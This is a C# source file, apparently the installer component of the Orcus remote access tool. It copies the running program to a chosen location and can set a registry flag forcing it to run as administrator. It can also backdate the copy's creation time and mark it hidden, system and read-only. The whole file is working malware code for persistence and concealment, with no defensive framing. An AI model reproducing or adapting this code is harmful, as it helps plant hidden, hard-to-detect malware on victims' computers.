using System;
using System.IO;
using Microsoft.Win32;
using Orcus.Config;
using Orcus.Shared.Settings;
using Orcus.Shared.Utilities;

namespace Orcus.Protection
{
    internal class Installer
    {
        public static bool Install(string path, string currentFile, out FileInfo file)
        {
            file = new FileInfo(path);

            if (string.Equals(file.FullName, currentFile, StringComparison.OrdinalIgnoreCase))
                return false;

            if (file.Exists)
            {
                try
                {
                    File.SetAttributes(file.FullName, FileAttributes.Normal);
                    file.Delete();
                }
                catch (Exception)
                {
                    return false;
                }
            }

            if (file.Directory != null && file.Directory.Exists == false)
                file.Directory.Create();

            File.Copy(currentFile, file.FullName);
            AppConfigWriter.WriteAppConfig(file);

            if (Settings.GetBuilderProperty<SetRunProgramAsAdminFlagBuilderProperty>().SetFlag)
            {
                try
                {
                    using (
                        var regkey =
                            Registry.CurrentUser.OpenSubKey(
                                @"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"))
                        regkey?.SetValue(file.FullName, "RUNASADMIN");
                }
                catch (UnauthorizedAccessException)
                {
                }
            }

            var changeCreationDateProperty = Settings.GetBuilderProperty<ChangeCreationDateBuilderProperty>();
            if (changeCreationDateProperty.IsEnabled)
                File.SetCreationTime(file.FullName, changeCreationDateProperty.NewCreationDate);

            if (Settings.GetBuilderProperty<HideFileBuilderProperty>().HideFile)
                File.SetAttributes(file.FullName,
                    FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
            return true;
        }
    }
}